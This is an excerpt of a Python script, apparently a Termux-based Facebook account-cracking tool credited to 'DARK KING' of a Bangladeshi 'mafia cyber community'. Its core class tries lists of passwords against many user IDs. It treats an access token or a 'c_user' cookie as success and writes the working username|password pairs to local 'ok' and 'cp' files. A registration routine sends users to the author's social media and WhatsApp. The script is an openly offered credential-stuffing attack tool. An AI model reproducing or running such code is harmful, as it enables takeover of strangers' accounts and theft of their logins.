...
------------------------------------------------------------------------------------------
🎭𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇 𝐗 𝐌𝐀𝐅𝐈𝐀 𝐂𝐘𝐁𝐄𝐑 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘🎭
-------------------------------------------------------------------------------------------     

             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : 𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : 𝐃𝐀𝐑𝐊𝐊𝐈𝐍𝐆 𝐂𝐘𝐁𝐄𝐑 𝟕𝟏    \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK :𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +𝟖𝟖𝟎𝟏𝟕𝟒𝟎𝟐𝟖𝟏𝟓𝟖𝟓     \033[1;93m▇▇
...
def reg():
    os.system('termux-setup-storage')
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/mdabdulbasit404')
    logo()
    print ('')
    ...
    if to in r:
        ...
        os.system('clear')
        os.system('xdg-open https://github.com/Darkkingcyber71/')
        logo()
        print('')
        ...
        os.system('am start https://wa.me/+𝟖𝟖𝟎𝟏𝟕𝟒𝟎𝟐𝟖𝟏𝟓𝟖𝟓?text=' + tks)
        reg()
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : 𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆");time.sleep (0.03)
    print("             [*]. FACEBOOK   : 𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆");time.sleep (0.03)
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                print('\r [OK-𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f'\r{H} [OK-𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆] {user} | {pw}')
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-ok.txt' , 'a').write('%s\n' % wrt)
